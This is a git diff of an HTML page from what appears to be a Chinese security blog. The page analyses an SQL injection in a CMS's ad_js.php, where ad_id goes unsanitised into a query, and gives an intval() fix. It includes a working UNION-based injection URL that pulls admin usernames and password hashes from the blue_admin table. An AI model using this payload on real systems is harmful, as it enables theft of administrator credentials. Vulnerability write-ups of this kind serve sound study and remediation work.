@@ -235,8 +235,8 @@ white-space: pre;
             <main class="main post-page">
     <article class="article-entry">
         <h3 id="漏洞代码-ad-js-php"><a href="#漏洞代码-ad-js-php" class="headerlink" title="漏洞代码(ad_js.php)"></a>漏洞代码(ad_js.php)</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">define(<span class="string">'IN_BLUE'</span>, <span class="keyword">true</span>);</span><br><span class="line"><span class="keyword">require_once</span> dirname(<span class="keyword">__FILE__</span>) . <span class="string">'/include/common.inc.php'</span>;</span><br><span class="line"></span><br><span class="line">$ad_id = !<span class="keyword">empty</span>($_GET[<span class="string">'ad_id'</span>]) ? trim($_GET[<span class="string">'ad_id'</span>]) : <span class="string">''</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>($ad_id))</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'Error!'</span>;</span><br><span class="line">	<span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$ad = $db-&gt;getone(<span class="string">"SELECT * FROM "</span>.table(<span class="string">'ad'</span>).<span class="string">" WHERE ad_id ="</span>.$ad_id);</span><br><span class="line"><span class="keyword">if</span>($ad[<span class="string">'time_set'</span>] == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">	$ad_content = $ad[<span class="string">'content'</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span>($ad[<span class="string">'end_time'</span>] &lt; time())</span><br><span class="line">	&#123;</span><br><span class="line">		$ad_content = $ad[<span class="string">'exp_content'</span>];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		$ad_content = $ad[<span class="string">'content'</span>];</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">$ad_content = str_replace(<span class="string">'"'</span>, <span class="string">'\"'</span>,$ad_content);</span><br><span class="line">$ad_content = str_replace(<span class="string">"\r"</span>, <span class="string">"\\r"</span>,$ad_content);</span><br><span class="line">$ad_content = str_replace(<span class="string">"\n"</span>, <span class="string">"\\n"</span>,$ad_content);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;!--\r\ndocument.write(\""</span>.$ad_content.<span class="string">"\");\r\n--&gt;\r\n"</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>该代码判断ad_id值是否为空，不为空就对传入的ad_id值进行trim()去除头尾空格<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ad_id = !<span class="keyword">empty</span>($_GET[<span class="string">'ad_id'</span>]) ? trim($_GET[<span class="string">'ad_id'</span>]) : <span class="string">''</span>;</span><br></pre></td></tr></table></figure></p>
-<p>然后直接把传入的ad_id值，拼接进SQL语句中，进行查询<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ad = $db-&gt;getone(<span class="string">"SELECT * FROM "</span>.table(<span class="string">'ad'</span>).<span class="string">" WHERE ad_id ="</span>.$ad_id);</span><br></pre></td></tr></table></figure></p>
+<p>该代码判断ad_id值是否为空，不为空就对传入的ad_id值进行trim()去除头尾空格<br><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ad_id = !empty($_GET[<span class="string">'ad_id'</span>]) ? <span class="keyword">trim</span>($_GET[<span class="string">'ad_id'</span>]) : <span class="string">''</span>;</span><br></pre></td></tr></table></figure></p>
+<p>然后直接把传入的ad_id值，拼接进SQL语句中，进行查询<br><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ad</span> = <span class="variable">$db</span>-&gt;getone(<span class="string">"SELECT * FROM "</span>.table(<span class="string">'ad'</span>).<span class="string">" WHERE ad_id ="</span>.<span class="variable">$ad_id</span>);</span><br></pre></td></tr></table></figure></p>
 <p>因此存在SQL注入漏洞，用户可以构造SQL联合查询语句查询其他信息</p>
 <h3 id="example"><a href="#example" class="headerlink" title="example"></a>example</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/cms/ad_js.php?ad_id=1 and 1=2 union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="keyword">concat</span>(admin_name,<span class="number">0x7C0D0A</span>,pwd),<span class="keyword">concat</span>(admin_name,<span class="number">0x7C0D0A</span>,pwd) <span class="keyword">from</span> blue_admin <span class="keyword">where</span> admin_id=<span class="number">1</span></span><br></pre></td></tr></table></figure>
 <h3 id="代码修复方案"><a href="#代码修复方案" class="headerlink" title="代码修复方案"></a>代码修复方案</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ad_id = !<span class="keyword">empty</span>($_GET[<span class="string">'ad_id'</span>]) ? intval($_GET[<span class="string">'ad_id'</span>]) : <span class="string">''</span>;</span><br></pre></td></tr></table></figure>
@@ -609,24 +609,6 @@ white-space: pre;
     
     
     
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
     <div class="total-archive" >目前才写: 21 篇博文，好好努力吧，骚年。 </div>
     
     <div class="post-archive">
@@ -669,6 +651,21 @@ white-space: pre;
     
     
         <li class="archive-post-item">
+            <span class="archive-post-date">12/08</span><a class="archive-post-title" href= "/2017/12/08/wooyun-1000php-9/" >PHP168 V6.02整站系统远程执行任意代码漏洞</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/08</span><a class="archive-post-title" href= "/2017/12/08/wooyun-1000php-12/" >游戏风云cms存在SQL注入</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/08</span><a class="archive-post-title" href= "/2017/12/08/wooyun-1000php-13/" >dedecms v5.3-v5.6 Get Shell</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
             <span class="archive-post-date">12/08</span><a class="archive-post-title" href= "/2017/12/08/wooyun-1000php-8/" >phpcms2008本地文件包括及利用（执行任意SQL脚本）</a>
         </li>
     
@@ -684,17 +681,12 @@ white-space: pre;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">12/08</span><a class="archive-post-title" href= "/2017/12/08/wooyun-1000php-13/" >dedecms v5.3-v5.6 Get Shell</a>
+            <span class="archive-post-date">12/08</span><a class="archive-post-title" href= "/2017/12/08/wooyun-1000php-7/" >phpwind远程代码执行漏洞-2010.09</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">12/08</span><a class="archive-post-title" href= "/2017/12/08/wooyun-1000php-9/" >PHP168 V6.02整站系统远程执行任意代码漏洞</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">12/08</span><a class="archive-post-title" href= "/2017/12/08/wooyun-1000php-12/" >游戏风云cms存在SQL注入</a>
+            <span class="archive-post-date">12/08</span><a class="archive-post-title" href= "/2017/12/08/wooyun-1000php-5/" >PHPCMS通杀XSS-2010.08</a>
         </li>
     
     
@@ -704,17 +696,7 @@ white-space: pre;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">12/08</span><a class="archive-post-title" href= "/2017/12/08/wooyun-1000php-7/" >phpwind远程代码执行漏洞-2010.09</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
             <span class="archive-post-date">12/08</span><a class="archive-post-title" href= "/2017/12/08/wooyun-1000php-6/" >phpcms 2008 sp4 爆路径及任意文件删除漏洞</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">12/08</span><a class="archive-post-title" href= "/2017/12/08/wooyun-1000php-5/" >PHPCMS通杀XSS-2010.08</a>
         </li>
     
     
@@ -747,15 +729,15 @@ white-space: pre;
         <div class="sidebar-tags">
     <div class="sidebar-tags-name">
     
+        <span class="sidebar-tag-name"><a href= "#">漏洞评估</a></span>
+    
         <span class="sidebar-tag-name"><a href= "#">web渗透-文件上传</a></span>
     
-        <span class="sidebar-tag-name"><a href= "#">漏洞评估</a></span>
+        <span class="sidebar-tag-name"><a href= "#">脑图</a></span>
     
         <span class="sidebar-tag-name"><a href= "#">wooyun-1000php</a></span>
     
         <span class="sidebar-tag-name"><a href= "#">小试牛刀</a></span>
-    
-        <span class="sidebar-tag-name"><a href= "#">脑图</a></span>
     
     </div>
     <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
